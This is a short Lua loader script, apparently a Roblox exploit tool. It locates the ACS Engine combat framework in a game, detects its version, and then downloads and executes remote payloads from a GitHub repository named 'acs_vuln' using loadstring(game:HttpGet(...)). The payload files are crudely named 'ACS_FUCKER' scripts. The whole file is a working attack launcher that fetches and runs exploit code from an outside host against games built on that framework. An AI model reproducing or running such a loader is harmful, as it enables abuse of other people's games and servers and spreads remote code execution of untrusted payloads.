local acs_index,events,ver,base_url = nil,nil,nil,'https://raw.githubusercontent.com/SiBiRiK/acs_vuln/main/'
for num,child in pairs(game.ReplicatedStorage:GetDescendants()) do
	if child.Name == 'ACS_Engine' then
		acs_index = child
		print('Got ACS Engine index folder!')
	end
	if child.Name == 'Eventos' then
		events = child
		ver = '1.7.6'
		print('Version: '..ver)
	end
	if child.Name == 'Events' then
		events = child
		ver = '2.0.1'
		print('Version: '..ver)
	end
end
if acs_index == nil then warn'Cannot find ACS Engine in game!' return end
if acs_index and ver then
	if ver == '1.7.6' then
		loadstring(game:HttpGet(base_url.."ACS_FUCKER_1.7.6_v2.lua"))()
	elseif ver == '2.0.1' then
		loadstring(game:HttpGet(base_url.."ACS_FUCKER_2.0.1_v2.lua"))()
	end
end
